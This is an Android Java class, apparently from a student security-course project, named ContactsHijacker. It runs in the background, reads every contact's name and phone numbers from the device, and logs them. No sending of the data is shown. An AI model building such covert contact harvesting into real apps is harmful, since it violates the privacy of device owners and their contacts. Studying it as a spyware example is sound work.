package com.seginfo.tp.seginfotp;

/**
 * Created by juan on 27/06/15.
 */
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;

public class ContactsHijacker extends AsyncTask<Activity, Void, Integer> {

    Activity _act;

    @Override
    protected Integer doInBackground(Activity... args) {
        _act = args[0];
        obtener_contactos();
        return 0;
    }

    private void obtener_contactos() {
        Log.i("MyActivity", "displayContacts");
        ContentResolver cr = _act.getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null);
        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {
                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                String phones = "";
                if (Integer.parseInt(cur.getString(
                        cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    Cursor pCur = cr.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = ?",
                            new String[]{id}, null);
                    while (pCur.moveToNext()) {
                        String phoneNo = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phones += phoneNo+",";
                    }
                    pCur.close();
                }
                Contact contacto = new Contact(Integer.parseInt(id), name, phones);
                Log.i("MyActivity", contacto.asString());
            }
        }
    }
}

